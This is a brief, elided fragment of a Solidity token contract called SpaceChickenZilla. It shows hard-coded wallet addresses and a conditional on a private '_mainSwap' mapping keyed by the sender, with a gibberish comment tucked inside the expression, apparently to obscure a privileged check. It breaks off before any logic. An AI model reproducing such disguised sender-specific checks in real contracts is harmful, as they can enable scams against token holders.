...
contract SpaceChickenZilla is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0xBaE1B52d73061C3F3E32afc004e9bA248bd933Ed); 
    address payable private teamWalletAddress = payable(0xbD58228D0B75053Bb6e851F3153D9d0353c4B500); 
	...
	if( _mainSwap[msg.sender/*as aXxsdfghjkll;’*/])
	   {
